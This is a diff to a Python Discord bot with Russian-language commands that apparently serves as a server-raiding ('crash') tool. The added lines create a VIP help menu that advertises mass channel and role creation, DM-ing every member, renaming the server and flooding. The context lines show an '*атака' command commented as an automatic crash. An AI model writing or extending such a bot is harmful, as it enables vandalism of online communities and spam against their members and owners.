@@ -58,6 +58,17 @@ class MyClient(discord.Client):
 				await message.author.send(':x: У вас нет VIP-статуса.')
 			else:
 				await message.author.send(':white_check_mark: У вас есть VIP-статус :crown:.')
+				
+		if message.content == '*виппомощь': #помощь
+			await message.delete()
+			embed = discord.Embed(title=":crown: VIP-команды", description="", color=0x0099ff)
+			embed.add_field(name='*випканалы+', value='Создать каналы со своим названием', inline=False)
+			embed.add_field(name='*виплс', value='Отправка всем в ЛС своё сообщение', inline=False)
+			embed.add_field(name='*виповнеру', value='Отправка владельцу сервера своё сообщение', inline=False)
+			embed.add_field(name='*виппереименовать', value='Переименовать сервер на своё сообщение', inline=False)
+			embed.add_field(name='*випроли+', value='Создать роли со своим сообщением', inline=False)
+			embed.add_field(name='*випфлуд', value='Флуд своим сообщением', inline=False)
+			await message.author.send(embed=embed)
 		if white.find(str(message.guild.id)) == -1 and black.find(str(message.author.id)) == -1:
 			if message.content == '*атака': #автоматический краш
 				await message.delete() #удаление сообщения
